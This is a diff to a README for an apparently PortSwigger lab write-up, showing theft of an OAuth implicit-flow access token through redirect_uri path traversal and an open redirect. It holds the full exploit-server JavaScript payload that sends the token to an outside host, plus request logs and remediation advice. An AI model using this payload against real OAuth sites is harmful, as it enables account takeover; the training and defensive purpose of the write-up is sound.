@@ -1,26 +1,32 @@
-# 🧨 OAuth Implicit Flow — Access Token Theft via `redirect_uri` Path Traversal
+# 🧨 Stealing OAuth Access Tokens via an Open Redirect
 
 ![Vuln](https://img.shields.io/badge/vuln-OAuth%20Misconfiguration-red)
 ![Severity](https://img.shields.io/badge/severity-high-orange)
 ![Platform](https://img.shields.io/badge/platform-PortSwigger%20Academy-blue)
-![Status](https://img.shields.io/badge/status-solved-success)
+![Status](https://img.shields.io/badge/status-exploitation%20verified-blue)
 
-A hands-on PortSwigger Web Security Academy walkthrough showing how weak `redirect_uri` validation, a path-normalization bypass, and an open redirect can leak an OAuth implicit-flow access token to an attacker-controlled server.
+An evidence-backed PortSwigger Web Security Academy write-up for **“Stealing OAuth access tokens via an open redirect.”** It chains loose `redirect_uri` validation, path normalization, and an open redirect to exfiltrate an implicit-flow access token and authenticate as `administrator`.
 
-## Summary
+> **Scope and evidence:** all hosts are ephemeral PortSwigger training infrastructure. The proof screenshots show the exploit-server source, the victim’s request in the exploit log, and the resulting administrator account page. Expired access tokens and API keys are redacted.
 
-The application uses OAuth's implicit flow (`response_type=token`). The OAuth provider accepts a callback that begins with the legitimate `/oauth-callback` path, but normalizes `/oauth-callback/..//post/next` into the application's open redirect. The provider attaches the access token as a URL fragment; the open redirect then carries it to the exploit server.
+## Executive Summary
+
+The OAuth provider allows a callback that begins with the registered `/oauth-callback` path but contains a traversal sequence. After URL normalization, the browser reaches `/post/next`, an open redirect controlled by the `path` parameter.
+
+Because the application uses the implicit flow, the OAuth access token is placed in the URL fragment. The attacker-controlled exploit page reads that fragment and sends the token to the exploit-server log. The captured token is then accepted by the client application, which creates an authenticated session for `administrator`.
 
 ```text
 Weak redirect_uri validation
-        +
-/oauth-callback/..//post/next path traversal
-        +
-Open redirect (/post/next?path=...)
-        +
-Implicit-flow fragment token
-        =
-Access-token leakage
+        ↓
+/oauth-callback/../post/next
+        ↓
+Open redirect to attacker page
+        ↓
+Implicit-flow access token in URL fragment
+        ↓
+Exploit JavaScript reads and logs token
+        ↓
+Administrator session confirmed
 ```
 
 ## Lab Environment
@@ -28,31 +34,30 @@ Access-token leakage
 | Component | Value |
 |---|---|
 | Platform | PortSwigger Web Security Academy |
-| OAuth flow | Implicit grant |
-| Client callback | `/oauth-callback` |
-| Redirect endpoint | `/post/next?path=...` |
-| OAuth scopes | `openid profile email` |
-| Objective | Obtain an OAuth token through the redirect chain |
+| Lab | Stealing OAuth access tokens via an open redirect |
+| OAuth flow | Implicit grant (`response_type=token`) |
+| Registered callback | `/oauth-callback` |
+| Redirect sink | `/post/next?path=...` |
+| Exploit path | `/exploit` |
+| Verified result | Access-token exfiltration and administrator account access |
 
-> Lab hosts and token values below were generated for this training instance and are now expired. Cookie and token secrets are redacted; the exploit path and request structure are preserved exactly.
+## 1. Normal OAuth Flow
 
-## Recon — Normal OAuth Flow
-
-The legitimate authorization request used `response_type=token`:
+The application sends an implicit-flow authorization request:
 
 ```http
 GET /auth?client_id=oc7f01hdwoe9tznmxvvv4&redirect_uri=https://0adc009503e981488201518900ad00b7.web-security-academy.net/oauth-callback&response_type=token&nonce=720517963&scope=openid%20profile%20email HTTP/1.1
 Host: oauth-0a4e0052034a81e2826e4fbd022d0082.oauth-server.net
 ```
 
-The provider returned a 302 and placed the access token in the fragment:
+The OAuth provider returns the bearer token in a fragment:
 
 ```http
 HTTP/2 302 Found
-Location: https://0adc009503e981488201518900ad00b7.web-security-academy.net/oauth-callback#access_token=<REDACTED_EPHEMERAL_ACCESS_TOKEN>&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
+Location: https://0adc009503e981488201518900ad00b7.web-security-academy.net/oauth-callback#access_token=<REDACTED_EXPIRED_ACCESS_TOKEN>&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
 ```
 
-The callback reads that fragment client-side, calls `/me` with the token, then POSTs the identity to `/authenticate`:
+The callback JavaScript extracts `access_token`, fetches the identity from `/me`, and submits it to `/authenticate`:
 
 ```javascript
 const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
@@ -66,30 +71,21 @@ fetch('https://oauth-0a4e0052034a81e2826e4fbd022d0082.oauth-server.net/me', {
   }
 })
 .then(r => r.json())
-.then(j =>
-  fetch('/authenticate', {
-    method: 'POST',
-    headers: {
-      'Accept': 'application/json',
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({ email: j.email, username: j.sub, token: token })
-  }).then(r => document.location = '/'))
+.then(j => fetch('/authenticate', {
+  method: 'POST',
+  headers: {
+    'Accept': 'application/json',
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({ email: j.email, username: j.sub, token: token })
+}))
 ```
 
-## Finding the Open Redirect
+This establishes the impact: a stolen token is sufficient for the client to create a session for the account represented by `j.sub`.
 
-The client application's next-post endpoint redirects to the value supplied in `path`:
+## 2. Open Redirect
 
-```http
-GET /post/next?path=/post?postId=8 HTTP/2
-Host: 0adc009503e981488201518900ad00b7.web-security-academy.net
-
-HTTP/2 302 Found
-Location: /post?postId=8
-```
-
-Supplying an external destination confirmed that it is an open redirect:
+The endpoint below redirects to the supplied `path`:
 
 ```http
 GET /post/next?path=https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net HTTP/2
@@ -99,93 +95,99 @@ HTTP/2 302 Found
 Location: https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net
 ```
 
-## Exploit — Bypassing `redirect_uri` Validation
+This is an open redirect: the application accepts an attacker-controlled absolute URL rather than enforcing a safe relative destination.
 
-The registered callback was `/oauth-callback`. I extended it with a path traversal sequence that resolved to the open redirect:
+## 3. Bypassing `redirect_uri` Validation
+
+The registered callback is `/oauth-callback`. The payload extends that trusted prefix with a traversal sequence that reaches the redirect endpoint:
 
 ```text
-/oauth-callback/..//post/next?path=https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net
+/oauth-callback/../post/next?path=https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net/exploit
 ```
 
-The exact modified authorization request was:
+The corresponding authorization request uses the legitimate client ID, scope, and implicit response type:
 
 ```http
-GET /auth?client_id=oc7f01hdwoe9tznmxvvv4&redirect_uri=https://0adc009503e981488201518900ad00b7.web-security-academy.net/oauth-callback/..//post/next?path=https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net&response_type=token&nonce=720517963&scope=openid%20profile%20email HTTP/2
+GET /auth?client_id=oc7f01hdwoe9tznmxvvv4&redirect_uri=https://0adc009503e981488201518900ad00b7.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net/exploit&response_type=token&nonce=720517963&scope=openid%20profile%20email HTTP/2
 Host: oauth-0a4e0052034a81e2826e4fbd022d0082.oauth-server.net
 ```
 
-The OAuth provider accepted it and issued the token-bearing redirect:
+The provider accepted this callback form. Once normalized, the request reaches `/post/next`; that endpoint redirects to the attacker’s `/exploit` page while the fragment token remains available to browser-side JavaScript.
 
-```http
-HTTP/2 302 Found
-Location: https://0adc009503e981488201518900ad00b7.web-security-academy.net//post/next?path=https%3A%2F%2Fexploit-0a7d00a2031481ed82d650060164006e.exploit-server.net#access_token=<REDACTED_EPHEMERAL_ACCESS_TOKEN>&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
-```
+## 4. Exact Exploit-Server Payload
 
-The target then redirects the browser to the exploit server:
+The saved exploit at `/exploit` first requests the malicious OAuth URL. When the browser returns to the exploit origin with a fragment, it reads the token and sends it to the exploit server in the `YOOO` query parameter.
 
-```http
-GET /post/next?path=https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net HTTP/2
-Host: 0adc009503e981488201518900ad00b7.web-security-academy.net
+```html
+<script>
+const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
+const token = urlSearchParams.get('access_token');
 
-HTTP/2 302 Found
-Location: https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net
-```
-
-Because the redirect does not specify a replacement fragment, the browser retains the OAuth fragment. The final URL is effectively:
-
-```text
-https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net#access_token=<REDACTED_EPHEMERAL_ACCESS_TOKEN>
-```
-
-An attacker page can read the fragment with:
-
-```javascript
-window.location.hash
-```
-
-## Token Validation
-
-Using the leaked token against the provider's identity endpoint returned the administrator identity:
-
-```http
-GET /me HTTP/1.1
-Host: oauth-0a4e0052034a81e2826e4fbd022d0082.oauth-server.net
-Authorization: Bearer <REDACTED_EPHEMERAL_ACCESS_TOKEN>
-Content-Type: application/json
-```
-
-```json
-{
-  "sub": "administrator",
-  "apikey": "<REDACTED_EPHEMERAL_API_KEY>",
-  "name": "Administrator",
-  "email": "administrator@normal-user.net",
-  "email_verified": true
+if (token) {
+  fetch('https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net/?YOOO=' + token)
+} else {
+  location="https://oauth-0a4e0052034a81e2826e4fbd022d0082.oauth-server.net/auth?client_id=oc7f01hdwoe9tznmxvvv4&redirect_uri=https://0adc009503e981488201518900ad00b7.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net/exploit&response_type=token&nonce=720517963&scope=openid%20profile%20email"
 }
+</script>
 ```
 
-This proved that the redirect chain leaked a valid administrator OAuth credential.
+## 5. Proof of Exploitation
+
+### Victim delivery and token capture
+
+The exploit-server access log records the victim browser loading the payload:
+
+```text
+10.0.3.129  2026-08-28 23:40:47 +0000  "GET /exploit/ HTTP/1.1" 200
+user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+```
+
+Immediately afterward, the same victim user agent requests the logging URL containing the token:
+
+```text
+10.0.3.129  2026-08-28 23:40:47 +0000  "GET /?YOOO=<REDACTED_EXPIRED_ACCESS_TOKEN> HTTP/1.1" 200
+user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+```
+
+That is direct evidence that the token was extracted from the fragment and delivered to the attacker-controlled origin.
+
+### Administrator account access
+
+Using the captured token completed the application’s normal authentication path. The resulting account page displayed:
+
+```text
+Your username is: administrator
+Your email is: administrator@normal-user.net
+Your API Key is: [hidden]
+```
+
+This verifies a successful administrator session.
+
+### Verification boundary
+
+The evidence confirms token theft and administrator access. The captured lab page still displayed **Not solved**, so this write-up does **not** claim final lab completion. A final solve claim should be added only with the resulting confirmation or submission response.
 
 ## Why the Chain Works
 
-1. The OAuth provider validates `redirect_uri` too loosely, allowing a URI that starts at the trusted callback but contains `/../`.
-2. URL path normalization reaches `/post/next`.
-3. `/post/next` accepts an arbitrary absolute URL in `path`.
-4. The implicit flow exposes the access token in the browser fragment.
-5. The open redirect sends the browser to the attacker origin without replacing the fragment.
-6. JavaScript on the attacker origin reads `window.location.hash`.
+1. The provider does not require the normalized `redirect_uri` to exactly match the registered callback.
+2. `/oauth-callback/../post/next` passes the loose callback check but resolves to the open redirect.
+3. `/post/next` redirects to the attacker-supplied `path`.
+4. The implicit flow places the bearer token in `window.location.hash`.
+5. Redirecting to the exploit page preserves the fragment for its JavaScript context.
+6. The payload reads `access_token` and deliberately logs it via `?YOOO=`.
+7. The client trusts the stolen token’s `/me` response and authenticates as `administrator`.
 
 ## Impact
 
-An attacker who can cause a victim with an active OAuth session to follow the malicious authorization URL can obtain the victim's access token. In this lab, the token identified the administrator and exposed privileged account data. In a real deployment, this can lead to account takeover or unauthorized API access.
+An attacker who can cause a victim with an active OAuth session to load the exploit can steal a bearer token and obtain an authenticated session as that victim. In this instance, the victim account was the administrator, demonstrating privileged account compromise.
 
 ## Remediation
 
-- Require an **exact**, canonical match between the requested `redirect_uri` and a registered callback URI; reject path traversal and normalization ambiguities.
-- Remove open redirects, or constrain destinations to a server-side allowlist of relative paths.
-- Prefer Authorization Code + PKCE over the implicit flow; do not expose bearer tokens in browser URLs.
-- Keep OAuth tokens short-lived and scope them minimally.
-- Treat URL-fragment forwarding across redirects as a token-leakage risk.
+- Register callback URIs explicitly and compare their **canonicalized, complete** values for an exact match.
+- Reject path traversal, double separators, and other path-normalization ambiguities before callback validation.
+- Remove open redirects; if a redirect is needed, use a server-side allowlist of relative destinations.
+- Replace the implicit flow with Authorization Code + PKCE and avoid exposing bearer tokens in browser URLs.
+- Limit token lifetime and scope; detect callback anomalies and token use from unexpected contexts.
 
 ## References
 
